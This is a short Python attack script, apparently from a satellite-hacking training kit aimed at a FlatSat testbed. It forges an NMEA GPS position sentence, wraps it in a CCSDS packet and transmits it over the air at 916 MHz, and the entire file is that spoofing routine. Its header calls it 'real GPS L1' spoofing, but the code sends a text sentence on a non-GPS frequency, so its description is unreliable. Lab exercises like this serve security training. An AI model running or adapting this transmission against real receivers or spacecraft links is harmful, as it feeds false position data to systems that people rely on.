#!/usr/bin/env python3
"""
Attack 04: Real GPS L1 Spoofing (RF Variant)
Transmits GPS L1 signal over-the-air.
"""
import os
import sys

LIB_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "lib"))
if LIB_DIR not in sys.path:
    sys.path.insert(0, LIB_DIR)

from pwnsat_rf import FlatSatRF
from pwnsat_packets import build_ccsds_packet

def main():
    print("[+] Attack 04: Real GPS L1 Spoofing (Over-The-Air RF Variant)")
    rf = FlatSatRF(freq=916000000)
    print("[*] Transmitting GPS NMEA spoofing payload over RF (916.0 MHz)...")
    nmea_spoof = b"$GPGGA,123519,4807.038,N,01131.000,E,1,08,0.9,545.4,M,46.9,M,,*47\r\n"
    pkt = build_ccsds_packet(apid=0x004, payload=nmea_spoof)
    rf.transmit_rf(pkt)
    rf.close()
    print("[✓] GPS RF signal spoofing transmitted.")

if __name__ == "__main__":
    main()
